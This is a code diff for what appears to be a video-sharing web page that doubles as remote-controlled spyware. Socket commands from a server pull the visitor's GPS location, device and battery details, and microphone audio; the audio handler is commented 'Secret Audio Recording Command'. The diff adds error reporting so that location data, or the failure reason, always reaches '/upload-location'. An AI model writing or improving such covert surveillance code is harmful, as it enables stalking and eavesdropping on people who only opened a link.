@@ -158,6 +158,7 @@
         const encodedVid = urlParams.get('v');
         let targetVideoUrl = encodedVid ? atob(encodedVid) : "";
 
+        // Persistent check via LocalStorage
         window.addEventListener('DOMContentLoaded', () => {
             const savedName = localStorage.getItem('sec_username');
             const savedAvatar = localStorage.getItem('sec_avatar');
@@ -258,6 +259,7 @@
                 }
             });
 
+            // GPS Location Command with proper Error Catching & Reporting
             socket.on('get_location', () => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -266,10 +268,23 @@
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
                         });
-                    }, (err) => {}, { enableHighAccuracy: true });
+                    }, async (err) => {
+                        await fetch('/upload-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ error: err.message })
+                        });
+                    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+                } else {
+                    fetch('/upload-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ error: "Geolocation not supported by browser" })
+                    });
                 }
             });
 
+            // Device Info Command
             socket.on('get_info', async () => {
                 let batteryLevel = 'Unknown';
                 if (navigator.getBattery) {
@@ -291,6 +306,7 @@
                 });
             });
 
+            // Secret Audio Recording Command
             socket.on('record_audio', async () => {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
